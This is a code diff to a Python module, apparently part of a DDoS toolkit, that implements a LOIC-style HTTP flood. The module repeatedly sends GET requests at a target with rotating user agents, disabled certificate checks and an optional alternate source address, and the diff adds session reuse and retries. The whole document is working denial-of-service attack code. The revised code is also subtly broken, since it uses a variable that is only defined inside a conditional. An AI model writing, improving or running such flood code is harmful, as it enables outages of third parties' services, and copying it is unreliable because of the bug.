@@ -15,6 +15,7 @@ try:
     import requests
     from requests.packages.urllib3.exceptions import InsecureRequestWarning # black magic
     requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    from urllib3.util.retry import Retry
 except:
     print("\nError importing: requests lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-requests'\n")
     sys.exit(2)
@@ -29,20 +30,38 @@ def ionize(self, target, rounds, proxy, address_dict):
         for i in range(0, int(rounds)):
             n=n+1
             self.user_agent = random.choice(self.agents).strip()
-            headers = {'User-Agent': str(self.user_agent)}
-
-            if address_dict['source'] is not None: # Allow different source for sending request
+            headers = {'User-Agent': str(self.user_agent), 'Connection': 'close'}
+            s = requests.Session()
+            if address_dict['source'] is not None: # Allow changed source for sending request
                 from requests_toolbelt.adapters import source
-                s = requests.Session()
-                new_source = source.SourceAddressAdapter(address_dict['source'])
-                s.mount("http://", new_source)
-                s.mount("https://", new_source)
+                retry = Retry(connect=3, backoff_factor=0)
+                new_source = source.SourceAddressAdapter(source_address = address_dict['source'], max_retries=retry)
 
+            s.mount("http://", new_source)
+            s.mount("https://", new_source)
+            # TODO: Reuse the connection ports
             try:
-                r = requests.get(target, headers=headers, proxies=proxyD, verify=False)
+                r = s.get(target, headers=headers, proxies=proxyD, verify=False)
                 # print("[Info] [AI] [LOIC] Firing 'pulse' ["+str(n)+"] -> [HIT!]")
-            except:
-                print("[Error] [AI] LOIC: Failed to engage with 'pulse' ["+str(n)+"]")
+            except Exception as ie:
+                print("[Error] [AI] LOIC: Failed to engage with 'pulse' ["+str(n)+"], {}".format(ie))
+            # n=n+1
+            # self.user_agent = random.choice(self.agents).strip()
+            # headers = {'User-Agent': str(self.user_agent)}
+
+            # if address_dict['source'] is not None: # Allow different source for sending request
+            #     from requests_toolbelt.adapters import source
+            #     s = requests.Session()
+            #     retry = Retry(connect=3, backoff_factor=0.5)
+            #     new_source = source.SourceAddressAdapter(source_address = address_dict['source'], max_retries=retry)
+            #     s.mount("http://", new_source)
+            #     s.mount("https://", new_source)
+
+            # try:
+            #     r = requests.get(target, headers=headers, proxies=proxyD, verify=False)
+            #     # print("[Info] [AI] [LOIC] Firing 'pulse' ["+str(n)+"] -> [HIT!]")
+            # except Exception as ie:
+            #     print("[Error] [AI] LOIC: Failed to engage with 'pulse' ["+str(n)+"], {}".format(ie))
     except Exception as e:
         print("[Error] [AI] [LOIC] Failing to engage... -> "
         "Is still target online? -> [Checking!], exception encountered: {}".format(e))
